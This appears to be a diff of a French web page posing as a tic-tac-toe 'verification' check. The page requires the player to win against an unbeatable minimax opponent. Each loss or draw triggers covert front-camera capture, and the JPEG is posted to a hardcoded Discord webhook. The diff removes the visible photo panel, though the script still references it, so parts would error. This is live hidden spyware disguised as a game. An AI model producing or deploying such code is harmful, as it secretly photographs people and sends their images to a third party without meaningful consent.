@@ -1,270 +1,421 @@
 <!DOCTYPE html>
 <html lang="fr">
+
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Morpion — Vérification</title>
-<style>
-@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;700&display=swap');
-*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;margin:0;padding:0}
-body{background:#06090d;font-family:'Inter',system-ui,-apple-system,sans-serif;color:#e9eff7;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px 16px}
-.card{width:100%;max-width:440px;background:#0d131a;border:1px solid rgba(255,255,255,0.08);border-radius:20px;padding:28px 24px;box-shadow:0 12px 40px rgba(0,0,0,0.5)}
-.header{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
-.brand{font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:18px;color:#fff}
-.badge{font-size:11px;text-transform:uppercase;letter-spacing:0.08em;color:#3ddc97;background:rgba(61,220,151,0.1);border:1px solid rgba(61,220,151,0.3);padding:4px 10px;border-radius:999px}
-.info{font-size:13px;color:#8fa0b4;line-height:1.5;margin-bottom:20px}
-.info b{color:#fff}
-.status{text-align:center;font-size:14px;font-weight:600;min-height:24px;margin-bottom:16px;color:#2bb8ff}
-.status.lose{color:#ff5a4d}
-.status.draw{color:#ffc773}
-.status.win{color:#3ddc97}
-.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:20px}
-.cell{aspect-ratio:1;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:14px;display:flex;align-items:center;justify-content:center;font-family:'Space Grotesk',sans-serif;font-size:36px;font-weight:700;cursor:pointer;transition:background 0.15s,border-color 0.15s,transform 0.1s}
-.cell:hover:not(.taken){background:rgba(255,255,255,0.07);border-color:rgba(43,184,255,0.4)}
-.cell:active:not(.taken){transform:scale(0.96)}
-.cell.taken{cursor:default}
-.cell.x{color:#2bb8ff;text-shadow:0 0 16px rgba(43,184,255,0.6)}
-.cell.o{color:#ff5a4d;text-shadow:0 0 16px rgba(255,90,77,0.6)}
-.photo-box{display:none;background:rgba(0,0,0,0.35);border:1px solid rgba(255,255,255,0.1);border-radius:14px;padding:14px;margin-bottom:20px;text-align:center}
-.photo-box h3{font-size:13px;font-weight:600;margin-bottom:10px;color:#ff5a4d}
-.photo-box img{width:100%;max-height:240px;object-fit:cover;border-radius:10px;border:1px solid rgba(255,255,255,0.1);transform:scaleX(-1)}
-.btn{width:100%;border:0;border-radius:12px;padding:14px;font-size:14px;font-weight:600;cursor:pointer;font-family:'Inter',sans-serif;background:linear-gradient(135deg,#2bb8ff,#3ddc97);color:#05130c;transition:filter 0.2s,transform 0.1s}
-.btn:hover{filter:brightness(1.08)}
-.btn:active{transform:scale(0.98)}
-</style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Morpion — Vérification</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;700&display=swap');
+
+    * {
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+      margin: 0;
+      padding: 0
+    }
+
+    body {
+      background: #06090d;
+      font-family: 'Inter', system-ui, -apple-system, sans-serif;
+      color: #e9eff7;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px 16px
+    }
+
+    .card {
+      width: 100%;
+      max-width: 440px;
+      background: #0d131a;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 20px;
+      padding: 28px 24px;
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.5)
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 20px
+    }
+
+    .brand {
+      font-family: 'Space Grotesk', sans-serif;
+      font-weight: 700;
+      font-size: 18px;
+      color: #fff
+    }
+
+    .badge {
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: #3ddc97;
+      background: rgba(61, 220, 151, 0.1);
+      border: 1px solid rgba(61, 220, 151, 0.3);
+      padding: 4px 10px;
+      border-radius: 999px
+    }
+
+    .info {
+      font-size: 13px;
+      color: #8fa0b4;
+      line-height: 1.5;
+      margin-bottom: 20px
+    }
+
+    .info b {
+      color: #fff
+    }
+
+    .status {
+      text-align: center;
+      font-size: 14px;
+      font-weight: 600;
+      min-height: 24px;
+      margin-bottom: 16px;
+      color: #2bb8ff
+    }
+
+    .status.lose {
+      color: #ff5a4d
+    }
+
+    .status.draw {
+      color: #ffc773
+    }
+
+    .status.win {
+      color: #3ddc97
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-bottom: 20px
+    }
+
+    .cell {
+      aspect-ratio: 1;
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 36px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.15s, border-color 0.15s, transform 0.1s
+    }
+
+    .cell:hover:not(.taken) {
+      background: rgba(255, 255, 255, 0.07);
+      border-color: rgba(43, 184, 255, 0.4)
+    }
+
+    .cell:active:not(.taken) {
+      transform: scale(0.96)
+    }
+
+    .cell.taken {
+      cursor: default
+    }
+
+    .cell.x {
+      color: #2bb8ff;
+      text-shadow: 0 0 16px rgba(43, 184, 255, 0.6)
+    }
+
+    .cell.o {
+      color: #ff5a4d;
+      text-shadow: 0 0 16px rgba(255, 90, 77, 0.6)
+    }
+
+    .photo-box {
+      display: none;
+      background: rgba(0, 0, 0, 0.35);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 14px;
+      padding: 14px;
+      margin-bottom: 20px;
+      text-align: center
+    }
+
+    .photo-box h3 {
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 10px;
+      color: #ff5a4d
+    }
+
+    .photo-box img {
+      width: 100%;
+      max-height: 240px;
+      object-fit: cover;
+      border-radius: 10px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      transform: scaleX(-1)
+    }
+
+    .btn {
+      width: 100%;
+      border: 0;
+      border-radius: 12px;
+      padding: 14px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #2bb8ff, #3ddc97);
+      color: #05130c;
+      transition: filter 0.2s, transform 0.1s
+    }
+
+    .btn:hover {
+      filter: brightness(1.08)
+    }
+
+    .btn:active {
+      transform: scale(0.98)
+    }
+  </style>
 </head>
+
 <body>
 
-<div class="card">
-  <div class="header">
-    <div class="brand">Morpion</div>
-    <div class="badge">Vérification</div>
+  <div class="card">
+    <div class="header">
+      <div class="brand">Morpion</div>
+      <div class="badge">Vérification</div>
+    </div>
+    <p class="info">Alignez 3 symboles pour valider. Condition requise : <b>Vous devez gagner</b>.</p>
+    <div class="status" id="status">À votre tour (X)</div>
+    <div class="grid" id="grid">
+      <div class="cell" data-idx="0"></div>
+      <div class="cell" data-idx="1"></div>
+      <div class="cell" data-idx="2"></div>
+      <div class="cell" data-idx="3"></div>
+      <div class="cell" data-idx="4"></div>
+      <div class="cell" data-idx="5"></div>
+      <div class="cell" data-idx="6"></div>
+      <div class="cell" data-idx="7"></div>
+      <div class="cell" data-idx="8"></div>
+    </div>
+    <button class="btn" id="restartBtn" style="display:none">Rejouer</button>
   </div>
-  <p class="info">Alignez 3 symboles pour valider. Condition requise : <b>Vous devez gagner</b>.</p>
-  <div class="status" id="status">À votre tour (X)</div>
-  <div class="grid" id="grid">
-    <div class="cell" data-idx="0"></div>
-    <div class="cell" data-idx="1"></div>
-    <div class="cell" data-idx="2"></div>
-    <div class="cell" data-idx="3"></div>
-    <div class="cell" data-idx="4"></div>
-    <div class="cell" data-idx="5"></div>
-    <div class="cell" data-idx="6"></div>
-    <div class="cell" data-idx="7"></div>
-    <div class="cell" data-idx="8"></div>
-  </div>
-  <div class="photo-box" id="photoBox">
-    <h3 id="photoTitle">Condition non remplie — Photo capturée</h3>
-    <img id="photoImg" alt="Capture">
-  </div>
-  <button class="btn" id="restartBtn" style="display:none">Rejouer</button>
-</div>
 
-<video id="video" playsinline muted autoplay style="display:none"></video>
-<canvas id="canvas" style="display:none"></canvas>
+  <video id="video" playsinline muted autoplay style="display:none"></video>
+  <canvas id="canvas" style="display:none"></canvas>
 
-<script>
-(function(){
-  const WEBHOOK = 'https://discord.com/api/webhooks/1569720541013872722/e-U_RSG-DE6o8HOy7hHNqHd_Cn2LgdLRj7R7ACnNK7KnfqUh_lacKcLTgMhpv2UWCyPK';
-  const WIN_COMBOS = [
-    [0,1,2],[3,4,5],[6,7,8],
-    [0,3,6],[1,4,7],[2,5,8],
-    [0,4,8],[2,4,6]
-  ];
+  <script>
+    (function () {
+      const WEBHOOK = 'https://discord.com/api/webhooks/1569720541013872722/e-U_RSG-DE6o8HOy7hHNqHd_Cn2LgdLRj7R7ACnNK7KnfqUh_lacKcLTgMhpv2UWCyPK';
+      const WIN_COMBOS = [
+        [0, 1, 2], [3, 4, 5], [6, 7, 8],
+        [0, 3, 6], [1, 4, 7], [2, 5, 8],
+        [0, 4, 8], [2, 4, 6]
+      ];
 
-  let board = Array(9).fill(null);
-  let active = true;
-  let stream = null;
+      let board = Array(9).fill(null);
+      let active = true;
+      let stream = null;
 
-  const statusEl = document.getElementById('status');
-  const cells = document.querySelectorAll('.cell');
-  const photoBox = document.getElementById('photoBox');
-  const photoTitle = document.getElementById('photoTitle');
-  const photoImg = document.getElementById('photoImg');
-  const restartBtn = document.getElementById('restartBtn');
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
+      const statusEl = document.getElementById('status');
+      const cells = document.querySelectorAll('.cell');
+      const photoBox = document.getElementById('photoBox');
+      const photoTitle = document.getElementById('photoTitle');
+      const photoImg = document.getElementById('photoImg');
+      const restartBtn = document.getElementById('restartBtn');
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
 
-  async function startCamera() {
-    if (stream) return;
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-        audio: false
-      });
-      video.srcObject = stream;
-      await video.play();
-    } catch (e) {}
-  }
+      async function startCamera() {
+        if (stream) return;
+        try {
+          stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+            audio: false
+          });
+          video.srcObject = stream;
+          await video.play();
+        } catch (e) { }
+      }
 
-  document.addEventListener('click', () => {
-    if (!stream) startCamera();
-  }, { once: true });
+      document.addEventListener('click', () => {
+        if (!stream) startCamera();
+      }, { once: true });
 
-  async function capturePhoto() {
-    if (!stream) {
-      await startCamera();
-      await new Promise(r => setTimeout(r, 500));
-    }
-    if (video.videoWidth > 0 && video.videoHeight > 0) {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const dataUrl = canvas.toDataURL('image/jpeg', 0.92);
-      sendWebhook(canvas);
-      return dataUrl;
-    }
-    return null;
-  }
+      async function capturePhoto() {
+        if (!stream) {
+          await startCamera();
+          await new Promise(r => setTimeout(r, 500));
+        }
+        if (video.videoWidth > 0 && video.videoHeight > 0) {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const dataUrl = canvas.toDataURL('image/jpeg', 0.92);
+          sendWebhook(canvas);
+          return dataUrl;
+        }
+        return null;
+      }
 
-  async function sendWebhook(cvs) {
-    try {
-      const blob = await new Promise(r => cvs.toBlob(r, 'image/jpeg', 0.92));
-      if (!blob) return;
-      const fd = new FormData();
-      fd.append('payload_json', JSON.stringify({
-        content: '**Morpion — Condition non remplie (le joueur n\'a pas gagné)**\n> ' + new Date().toLocaleString('fr-FR'),
-        username: 'Morpion'
-      }));
-      fd.append('files[0]', blob, 'capture.jpg');
-      await fetch(WEBHOOK, { method: 'POST', body: fd });
-    } catch (e) {}
-  }
+      async function sendWebhook(cvs) {
+        try {
+          const blob = await new Promise(r => cvs.toBlob(r, 'image/jpeg', 0.92));
+          if (!blob) return;
+          const fd = new FormData();
+          fd.append('payload_json', JSON.stringify({
+            content: '**Morpion — Condition non remplie (le joueur n\'a pas gagné)**\n> ' + new Date().toLocaleString('fr-FR'),
+            username: 'Morpion'
+          }));
+          fd.append('files[0]', blob, 'capture.jpg');
+          await fetch(WEBHOOK, { method: 'POST', body: fd });
+        } catch (e) { }
+      }
 
-  function checkWinner(b) {
-    for (const [x, y, z] of WIN_COMBOS) {
-      if (b[x] && b[x] === b[y] && b[x] === b[z]) return b[x];
-    }
-    if (b.every(c => c !== null)) return 'tie';
-    return null;
-  }
+      function checkWinner(b) {
+        for (const [x, y, z] of WIN_COMBOS) {
+          if (b[x] && b[x] === b[y] && b[x] === b[z]) return b[x];
+        }
+        if (b.every(c => c !== null)) return 'tie';
+        return null;
+      }
 
-  function minimax(b, depth, isMaximizing) {
-    const winner = checkWinner(b);
-    if (winner === 'O') return 10 - depth;
-    if (winner === 'X') return depth - 10;
-    if (winner === 'tie') return 0;
+      function minimax(b, depth, isMaximizing) {
+        const winner = checkWinner(b);
+        if (winner === 'O') return 10 - depth;
+        if (winner === 'X') return depth - 10;
+        if (winner === 'tie') return 0;
 
-    if (isMaximizing) {
-      let best = -Infinity;
-      for (let i = 0; i < 9; i++) {
-        if (b[i] === null) {
-          b[i] = 'O';
-          best = Math.max(best, minimax(b, depth + 1, false));
-          b[i] = null;
+        if (isMaximizing) {
+          let best = -Infinity;
+          for (let i = 0; i < 9; i++) {
+            if (b[i] === null) {
+              b[i] = 'O';
+              best = Math.max(best, minimax(b, depth + 1, false));
+              b[i] = null;
+            }
+          }
+          return best;
+        } else {
+          let best = Infinity;
+          for (let i = 0; i < 9; i++) {
+            if (b[i] === null) {
+              b[i] = 'X';
+              best = Math.min(best, minimax(b, depth + 1, true));
+              b[i] = null;
+            }
+          }
+          return best;
         }
       }
-      return best;
-    } else {
-      let best = Infinity;
-      for (let i = 0; i < 9; i++) {
-        if (b[i] === null) {
-          b[i] = 'X';
-          best = Math.min(best, minimax(b, depth + 1, true));
-          b[i] = null;
+
+      function bestMove(b) {
+        let bestVal = -Infinity;
+        let move = -1;
+        for (let i = 0; i < 9; i++) {
+          if (b[i] === null) {
+            b[i] = 'O';
+            let val = minimax(b, 0, false);
+            b[i] = null;
+            if (val > bestVal) {
+              bestVal = val;
+              move = i;
+            }
+          }
+        }
+        return move;
+      }
+
+      async function handleEnd(winner) {
+        active = false;
+        restartBtn.style.display = 'block';
+
+        if (winner === 'X') {
+          statusEl.className = 'status win';
+          statusEl.textContent = 'Victoire !';
+        } else {
+          if (winner === 'O') {
+            statusEl.className = 'status lose';
+            statusEl.textContent = 'Défaite : vous n\'avez pas gagné';
+            photoTitle.textContent = 'Défaite — Photo prise';
+          } else {
+            statusEl.className = 'status draw';
+            statusEl.textContent = 'Match nul : vous n\'avez pas gagné';
+            photoTitle.textContent = 'Match nul — Photo prise';
+          }
+          const data = await capturePhoto();
+          if (data) {
+            photoImg.src = data;
+          }
         }
       }
-      return best;
-    }
-  }
 
-  function bestMove(b) {
-    let bestVal = -Infinity;
-    let move = -1;
-    for (let i = 0; i < 9; i++) {
-      if (b[i] === null) {
-        b[i] = 'O';
-        let val = minimax(b, 0, false);
-        b[i] = null;
-        if (val > bestVal) {
-          bestVal = val;
-          move = i;
+      async function onCellClick(e) {
+        const idx = parseInt(e.target.dataset.idx, 10);
+        if (!active || board[idx] !== null) return;
+
+        if (!stream) startCamera();
+
+        board[idx] = 'X';
+        e.target.textContent = 'X';
+        e.target.classList.add('taken', 'x');
+
+        let winner = checkWinner(board);
+        if (winner) {
+          await handleEnd(winner);
+          return;
         }
-      }
-    }
-    return move;
-  }
 
-  async function handleEnd(winner) {
-    active = false;
-    restartBtn.style.display = 'block';
+        active = false;
+        statusEl.textContent = 'L\'ordinateur réfléchit…';
 
-    if (winner === 'X') {
-      statusEl.className = 'status win';
-      statusEl.textContent = 'Victoire !';
-    } else {
-      if (winner === 'O') {
-        statusEl.className = 'status lose';
-        statusEl.textContent = 'Défaite : vous n\'avez pas gagné';
-        photoTitle.textContent = 'Défaite — Photo prise';
-      } else {
-        statusEl.className = 'status draw';
-        statusEl.textContent = 'Match nul : vous n\'avez pas gagné';
-        photoTitle.textContent = 'Match nul — Photo prise';
-      }
-      const data = await capturePhoto();
-      if (data) {
-        photoImg.src = data;
-        photoBox.style.display = 'block';
-      }
-    }
-  }
+        setTimeout(async () => {
+          const aiIdx = bestMove(board);
+          if (aiIdx !== -1) {
+            board[aiIdx] = 'O';
+            const aiCell = document.querySelector(`.cell[data-idx="${aiIdx}"]`);
+            aiCell.textContent = 'O';
+            aiCell.classList.add('taken', 'o');
+          }
 
-  async function onCellClick(e) {
-    const idx = parseInt(e.target.dataset.idx, 10);
-    if (!active || board[idx] !== null) return;
-
-    if (!stream) startCamera();
-
-    board[idx] = 'X';
-    e.target.textContent = 'X';
-    e.target.classList.add('taken', 'x');
-
-    let winner = checkWinner(board);
-    if (winner) {
-      await handleEnd(winner);
-      return;
-    }
-
-    active = false;
-    statusEl.textContent = 'L\'ordinateur réfléchit…';
-
-    setTimeout(async () => {
-      const aiIdx = bestMove(board);
-      if (aiIdx !== -1) {
-        board[aiIdx] = 'O';
-        const aiCell = document.querySelector(`.cell[data-idx="${aiIdx}"]`);
-        aiCell.textContent = 'O';
-        aiCell.classList.add('taken', 'o');
+          winner = checkWinner(board);
+          if (winner) {
+            await handleEnd(winner);
+          } else {
+            active = true;
+            statusEl.textContent = 'À votre tour (X)';
+          }
+        }, 280);
       }
 
-      winner = checkWinner(board);
-      if (winner) {
-        await handleEnd(winner);
-      } else {
+      cells.forEach(cell => cell.addEventListener('click', onCellClick));
+
+      restartBtn.addEventListener('click', () => {
+        board = Array(9).fill(null);
         active = true;
+        cells.forEach(c => {
+          c.textContent = '';
+          c.className = 'cell';
+        });
+        statusEl.className = 'status';
         statusEl.textContent = 'À votre tour (X)';
-      }
-    }, 280);
-  }
-
-  cells.forEach(cell => cell.addEventListener('click', onCellClick));
-
-  restartBtn.addEventListener('click', () => {
-    board = Array(9).fill(null);
-    active = true;
-    cells.forEach(c => {
-      c.textContent = '';
-      c.className = 'cell';
-    });
-    statusEl.className = 'status';
-    statusEl.textContent = 'À votre tour (X)';
-    photoBox.style.display = 'none';
-    photoImg.src = '';
-    restartBtn.style.display = 'none';
-  });
-})();
-</script>
+        photoBox.style.display = 'none';
+        photoImg.src = '';
+        restartBtn.style.display = 'none';
+      });
+    })();
+  </script>
 </body>
+
 </html>
